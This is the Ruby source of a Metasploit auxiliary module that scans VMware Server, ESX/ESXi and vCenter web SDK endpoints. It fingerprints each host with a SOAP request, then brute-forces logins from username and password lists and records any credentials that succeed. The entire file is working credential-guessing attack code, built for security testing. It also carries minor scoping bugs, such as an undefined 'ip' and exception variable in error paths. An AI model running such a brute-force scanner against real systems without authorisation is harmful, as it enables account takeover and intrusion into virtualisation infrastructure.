##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/ntlm/message'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::VIMSoap
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'VMWare Web Login Scanner',
      'Description'    => 'This module attempts to authenticate to the VMWare HTTP service
        for VmWare Server, ESX, and ESXI',
      'Author'         => ['theLightCosine'],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'SSL' => true }
    )

    register_options(
      [
        OptString.new('URI', [true, "The default URI to login with", "/sdk"]),
        Opt::RPORT(443)
      ])
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'vmware',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    return unless is_vmware?
    each_user_pass { |user, pass|
      result = vim_do_login(user, pass)
      case result
      when :success
        print_good "#{rhost}:#{rport} - Successful Login! (#{user}:#{pass})"
        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: result)
        return if datastore['STOP_ON_SUCCESS']
      when :fail
        print_error "#{rhost}:#{rport} - Login Failure (#{user}:#{pass})"
      end
    }
  end


  # Mostly taken from the Apache Tomcat service validator
  def is_vmware?
    soap_data =
      %Q|<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <env:Body>
      <RetrieveServiceContent xmlns="urn:vim25">
        <_this type="ServiceInstance">ServiceInstance</_this>
      </RetrieveServiceContent>
      </env:Body>
      </env:Envelope>|

    begin
      res = send_request_cgi({
        'uri'     => normalize_uri(datastore['URI']),
        'method'  => 'POST',
        'agent'   => 'VMware VI Client',
        'data'    => soap_data
      }, 25)

      if res
        fingerprint_vmware(res)
      else
        vprint_error("#{rhost}:#{rport} Error: no response")
      end

    rescue ::Rex::ConnectionError => e
      vprint_error("#{rhost}:#{rport} Error: could not connect")
      return false
    rescue
      vprint_error("#{rhost}:#{rport} Error: #{e}")
      return false
    end
  end

  def fingerprint_vmware(res)
    unless res
      vprint_error("#{rhost}:#{rport} Error: no response")
      return false
    end
    return false unless res.body.include?('<vendor>VMware, Inc.</vendor>')

    os_match = res.body.match(/<name>([\w\s]+)<\/name>/)
    ver_match = res.body.match(/<version>([\w\s\.]+)<\/version>/)
    build_match = res.body.match(/<build>([\w\s\.\-]+)<\/build>/)
    full_match = res.body.match(/<fullName>([\w\s\.\-]+)<\/fullName>/)

    if full_match
      print_good "#{rhost}:#{rport} - Identified #{full_match[1]}"
      report_service(:host => rhost, :port => rport, :proto => 'tcp', :sname => 'https', :info => full_match[1])
    end

    if os_match and ver_match and build_match
      if os_match[1] =~ /ESX/ or os_match[1] =~ /vCenter/
        # Report a fingerprint match for OS identification
        report_note(
          :host  => ip,
          :ntype => 'fingerprint.match',
          :data  => {'os.vendor' => 'VMware', 'os.product' => os_match[1] + " " + ver_match[1], 'os.version' => build_match[1] }
        )
      end
      return true
    else
      vprint_error("#{rhost}:#{rport} Error: Could not identify as VMWare")
      return false
    end

  end


end
